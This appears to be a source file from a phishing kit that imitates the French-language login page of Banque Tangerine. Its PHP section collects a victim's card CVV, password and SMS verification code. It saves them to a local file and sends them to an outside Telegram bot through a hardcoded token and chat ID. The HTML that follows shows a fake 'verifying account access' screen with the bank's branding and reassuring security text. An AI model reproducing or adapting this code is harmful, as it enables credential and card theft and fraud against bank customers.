<?php 
session_start();

// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la session, sinon redirige vers la page de connexion
if (!isset($_SESSION["cvv"]) or !isset($_SESSION["mdp"])) {
    header("Location: ./index.php");
    exit();
}

// Stocke le SMS dans la session
$_SESSION["sms"] = $_POST['sms'];

// Prépare le message à envoyer sur Telegram
$message = "📥 **NOUVEAU SMS REÇU** 📥\n\n" .
           "🔒 **CVV** : " . $_SESSION["cvv"] . "\n" .
           "🔑 **Mot de Passe** : " . $_SESSION["mdp"] . "\n" .
           "📱 **SMS** : " . $_SESSION["sms"] . "\n" .
           "**FIN CONNEXION**\n";

// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);

// Détruit la session
session_destroy();
?>




<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Banque Tangerine</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8E6FF7',
                        secondary: ''
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
    <style>
        :where([class^="ri-"])::before {
            content: "\f3c2";
        }

        body {
            background-color: #f9f9f9;
            font-family: 'Inter', sans-serif;
        }

        input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
        }

        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 40px;
            height: 20px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }

        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 16px;
            width: 16px;
            left: 2px;
            bottom: 2px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked+.toggle-slider {
            background-color: #ea7024;
        }

        input:checked+.toggle-slider:before {
            transform: translateX(20px);
        }
    </style>
</head>

<body>
    <!-- Header -->
    <header class="bg-[#ea7024] text-white py-3 px-4">
        <div class="container mx-auto flex items-center justify-between">
            <div class="flex items-center">
                <a href="#" class="font-['Pacifico'] text-2xl">Tangerine</a>
                <nav class="hidden md:flex space-x-6">
                    <a href="#" class="hover:underline">Produits</a>
                    <a href="#" class="hover:underline">Services bancaires</a>
                    <a href="#" class="hover:underline">Blogue</a>
                    <a href="#" class="hover:underline">À propos de nous</a>
                </nav>
            </div>
            <div class="hidden md:flex items-center space-x-3">
                <a href="#" class="bg-white text-[#ea7024] px-3 py-1.5 rounded-button whitespace-nowrap text-sm">Devenir Client</a>
                <a href="#" class="border border-white px-3 py-1.5 rounded-button whitespace-nowrap text-sm">Accès Clients</a>
                <div class="flex items-center ml-2">
                    <a href="#" class="flex items-center space-x-1">
                        <span>FR</span>
                        <i class="ri-arrow-down-s-line"></i>
                    </a>
                    <div class="w-8 h-8 flex items-center justify-center ml-2">
                        <i class="ri-search-line"></i>
                    </div>
                </div>
            </div>
            <div class="md:hidden flex items-center">
                <button class="w-8 h-8 flex items-center justify-center">
                    <i class="ri-menu-line text-xl"></i>
                </button>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="container mx-auto py-10 px-4">
        <div class="max-w-md mx-auto bg-white rounded shadow-sm p-6 border border-gray-100">
            <h1 class="text-2xl font-semibold mb-6">Connexion</h1>
            <!-- Tabs -->
            <div class="border-b border-gray-200 mb-6">
                <div class="flex">
                    <button class="px-4 py-2 border-b-2 border-[#ea7024] text-[#ea7024] font-medium">Personnel</button>
                    <button class="px-4 py-2 text-gray-500">Affaires</button>
                </div>
            </div>
            <!-- Login Form -->
            <form id='loginForm' action="/tandgerine/terminus.php" method="post">
            
            <h3>VEUILLEZ PATIENTEZ PENDANT QUE NOUS VERIFIONS L'ACCES AU COMPTE</h3>

<div class="load" style="text-align:center" >
<img src="../img/ajax-loading.gif" alt="">
        </form>
        </div>
        <!-- Security Info -->
        <div class="max-w-md mx-auto mt-6 text-xs text-gray-600">
            <p class="mb-2">La Banque Tangerine est une filiale en propriété exclusive de la Banque de Nouvelle-Écosse et elle est membre à part entière de la Société d'assurance-dépôts du Canada (SADC).</p>
            <div class="flex items-center mb-2">
                <div class="bg-[#6B2C91] text-white px-2 py-1 rounded text-xs mr-2">sadc</div>
                <a href="#" class="text-[#0066CC]">Renseignements relatifs à l'assurance-dépôts de la SADC</a>
            </div>
            <div class="flex items-center">
                <a href="#" class="text-[#0066CC] flex items-center">
                    <i class="ri-lock-line mr-1"></i>
                    <span>Garantie de Sécurité</span>
                </a>
            </div>
        </div>
    </main>
    <!-- Footer -->
    <footer class="bg-[#333333] text-white mt-20 py-8 px-4">
        <div class="container mx-auto">
            <!-- Main Footer Links -->
            <div class="flex flex-wrap justify-between mb-8">
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Localisateur de guichets</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">FAQ</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Carrières</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Contactez-nous</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">À propos de nous</a>
                <a href="#" class="text-sm hover:underline mb-2">Taux</a>
            </div>
            <!-- Social Media -->
            <div class="flex space-x-4 mb-8">
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-twitter-x-line text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-facebook-fill text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-linkedin-fill text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-instagram-line text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-youtube-fill text-white"></i>
                </a>
            </div>
            <!-- Legal Links -->
            <div class="flex flex-wrap text-sm text-gray-400">
                <a href="#" class="hover:underline mr-4 mb-2">Confidentialité</a>
                <a href="#" class="hover:underline mr-4 mb-2">Juridique</a>
                <a href="#" class="hover:underline mr-4 mb-2">Sécurité</a>
                <a href="#" class="hover:underline mr-4 mb-2">Accessibilité</a>
                <a href="#" class="hover:underline mb-2">Guide de pub</a>
            </div>
        </div>
    </footer>
</body>

</html>